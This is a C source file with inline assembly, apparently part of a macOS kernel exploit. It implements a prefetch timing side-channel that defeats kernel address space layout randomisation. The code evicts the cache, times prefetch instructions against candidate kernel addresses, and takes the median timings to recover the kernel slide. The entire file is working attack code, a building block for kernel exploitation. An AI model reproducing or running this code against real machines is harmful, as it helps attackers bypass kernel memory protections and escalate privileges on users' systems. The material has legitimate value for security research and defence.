#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdint.h>             // uint64_t
#include <stdlib.h>             // malloc, free, qsort
#include <string.h>             // strerror

#include <sys/sysctl.h>         // sysctl

#include "common.h"             // ERR, LOG, FOREACH_CMD
#include "config.h"             // PREFETCH_LIMIT
#include "kaslr.h"

uint64_t time_addr(uint64_t addr, uint8_t *mem, uint32_t cachesize, uint32_t cacheline);

__asm__
(
    "_time_addr:\n"
    // Evict cache
    "evict:\n"
    "   subl %ecx, %edx\n"
    "   movq $0, (%rsi, %rdx, 1)\n"
    "   cmp $0, %edx\n"
    "   jg evict\n"
    // Prefetch+Time
    "   mfence\n"
    "   rdtscp\n"
    "   movl %eax, %r10d\n"
    "   movl %edx, %r11d\n"
    "   prefetcht2 (%rdi)\n"
    "   rdtscp\n"
    // Calculate return value
    "   subl %r11d, %edx\n"
    "   subl %r10d, %eax\n"
    "   salq $32, %rdx\n"
    "   orq %rdx, %rax\n"
    "   ret\n"
);

static int numerical_compare(const void *a, const void *b)
{
    return *(const uint64_t*)a - *(const uint64_t*)b;
}

static uint64_t median_avg(uint64_t *arr, size_t len)
{
    uint64_t avg = 0;
    for(size_t i = len * 3/8; i < len * 5/8; ++i)
    {
        avg += arr[i];
    }
    return avg / (len / 4);
}

uint64_t get_kernel_slide(void *kernel)
{
    LOG("Getting kernel slide...");

    uint64_t text_base = 0,
             text_size = 0;
    FOREACH_CMD(kernel, cmd)
    {
        if(cmd->cmd == LC_SEGMENT_64)
        {
            text_base = ((seg_t*)cmd)->vmaddr;
            text_size = ((seg_t*)cmd)->vmsize;
            goto found;
        }
    }
    ERR("Failed to get unslid kernel base address from binary");
    return -1;

    found:;
    LOG("Unslid kernel base is 0x%016llx", text_base);

    int ctrl[] = { CTL_HW, HW_L3CACHESIZE };
    uint32_t cachesize = 0;
    size_t size = sizeof(cachesize);
    if(sysctl(ctrl, sizeof(ctrl) / sizeof(*ctrl), &cachesize, &size, NULL, 0) != 0)
    {
        ERR("sysctl(\"hw.l3cachesize\") failed: %s", strerror(errno));
        return -1;
    }
    LOG("L3 cache size: %u", cachesize);

    ctrl[1] = HW_CACHELINE;
    uint32_t cacheline = 0;
    size = sizeof(cacheline);
    if(sysctl(ctrl, sizeof(ctrl) / sizeof(*ctrl), &cacheline, &size, NULL, 0) != 0)
    {
        ERR("sysctl(\"hw.cachelinesize\") failed: %s", strerror(errno));
        return -1;
    }
    LOG("Cacheline size: %u", cacheline);

    void *mem = malloc(cachesize);
    if(mem == NULL)
    {
        ERR("Failed to allocate cache eviction buffer: %s", strerror(errno));
        return -1;
    }

    LOG("Doing timings, this might take a bit (and requires radio silence)...");
    uint64_t slide = -1;

    // Probe kernel mem
#define NUM_PROBE 16
    uint64_t *buf = malloc(NUM_PROBE * sizeof(*buf));
    if(buf == NULL)
    {
        ERR("Failed to allocate timings buffer: %s", strerror(errno));
        goto cleanup;
    }

    size_t num_need = (text_size + SLIDE_STEP - 1) / SLIDE_STEP,
           num_have = 0;
    for(uint64_t off = 0; off < SLIDE_MAX; off += SLIDE_STEP)
    {
        for(size_t i = 0; i < NUM_PROBE; ++i)
        {
            sched_yield(); // reduce likelihood for preemption
            buf[i] = time_addr(text_base + off, mem, cachesize, cacheline);
        }
        qsort(buf, NUM_PROBE, sizeof(*buf), &numerical_compare);
        if(median_avg(buf, NUM_PROBE) > PREFETCH_LIMIT)
        {
            num_have = 0;
        }
        else
        {
            ++num_have;
            if(num_have >= num_need)
            {
                slide = off - (SLIDE_STEP * (num_have - 1));
                break;
            }
        }
    }

    if(slide == -1)
    {
        ERR("Failed to determine kernel slide");
    }
    else
    {
        LOG("Kernel slide: 0x%llx", slide);
    }

    free(buf);
cleanup:;
    free(mem);
    return slide;
}
